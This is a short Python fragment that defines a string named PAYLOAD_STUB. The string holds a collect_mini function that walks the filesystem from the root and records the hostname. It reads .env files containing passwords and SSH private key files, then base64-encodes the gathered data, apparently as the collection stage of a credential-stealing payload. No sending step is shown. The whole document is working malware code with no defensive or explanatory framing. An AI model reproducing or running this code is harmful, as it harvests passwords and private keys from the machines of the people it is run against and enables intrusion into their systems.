PAYLOAD_STUB = """
import os, json, zlib, base64, subprocess, sys, socket

def collect_mini():
    data = {
        "host": socket.gethostname(),
        "os": os.name,
        "env_files": [],
        "ssh_keys": []
    }
    # Recherche .env
    for root, dirs, files in os.walk("C:\\\\" if os.name == 'nt' else "/"):
        if os.name == 'nt':
            if root.count("\\\\") > 3: break
        else:
            if root.count("/") > 3: break
        for f in files:
            if f.endswith('.env') or f == '.env':
                path = os.path.join(root, f)
                try:
                    with open(path, 'r', errors='ignore') as fp:
                        c = fp.read(500)
                    if 'PASSWORD' in c.upper():
                        data['env_files'].append({"path": path, "content": c[:200]})
                except:
                    pass
            if f.startswith('id_') and os.name != 'nt':
                path = os.path.join(root, f)
                try:
                    with open(path, 'r') as fp:
                        data['ssh_keys'].append({"path": path, "key": fp.read(300)})
                except:
                    pass
        if len(data['env_files']) > 3 and len(data['ssh_keys']) > 1:
            break
    return base64.b64encode(json.dumps(data).encode()).decode()
"""